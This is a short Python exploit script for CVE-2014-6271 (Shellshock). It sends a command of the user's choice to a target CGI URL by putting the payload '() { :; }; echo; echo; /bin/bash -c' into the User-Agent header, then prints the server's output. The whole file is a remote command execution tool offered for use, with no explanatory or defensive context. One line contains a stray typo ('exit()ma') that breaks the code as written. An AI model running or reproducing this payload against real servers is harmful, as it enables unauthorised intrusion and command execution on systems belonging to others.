# CVE-2014-6271
# N7y


import sys
import requests



count = 1                                                                                                                                                                                       
for i in range(6):                                                                                                                                                                              
        try:                                                                                                                                                                                    
                sys.argv[int(i)]                                                                                                                                                                
        except IndexError:                                                                                                                                                                      
                break                                                                                                                                                                           
        count = count + 1                                                                                                                                                                       
                                                                                                                                                                                                
                                                                                                                                                      
                                                                                                                                                                                                
host = ""                                                                                                                                                                                    
cmd = ""                                                                                                                                                                                    
if (count - 2) == 2:                                                                                                                                                                            
        host = sys.argv[1]                                                                                                                                                                   
        cmd = sys.argv[2] 
                                                                                                                                                                      
elif (count - 2) == 1:                                                                                                                                                                          
        host = sys.argv[1]
        print(f"[usage ]: CVE-2014-6271.py {host} cmd")  
        exit()                                                                                                                                                                 
elif (count - 2) > 2:                                                                                                                                                                           
        host = sys.argv[1]                                                                                                                                                                   
        cmd = ' '.join(sys.argv[2:]) 
                                                                                                                                                              
else:                                                                                                                                                                                           
        print("[usage ]: CVE-2014-6271.py http://host/cgi-bin/file cmd ")                                                                                                                               
                                                                                                                                  
        exit()ma
print(f"Executing {cmd}")
c= cmd




headers = requests.utils.default_headers()
headers.update(
    {
        "User-Agent": "() { :; }; echo; echo; /bin/bash -c '" +c+"'" ,
    }
)




if cmd == "--help" or cmd == '?':
	print(" Usage :  python3 CVE-2014-6271.py  http://host/cgi-bin/file cmd")
	exit()

h = '/'.join(host.split('/')[:-1])
try:
	requests.get(h)
except:
	print(f"{h} DOWN")
	exit()


req = requests.get(host,headers=headers)
print(req.text)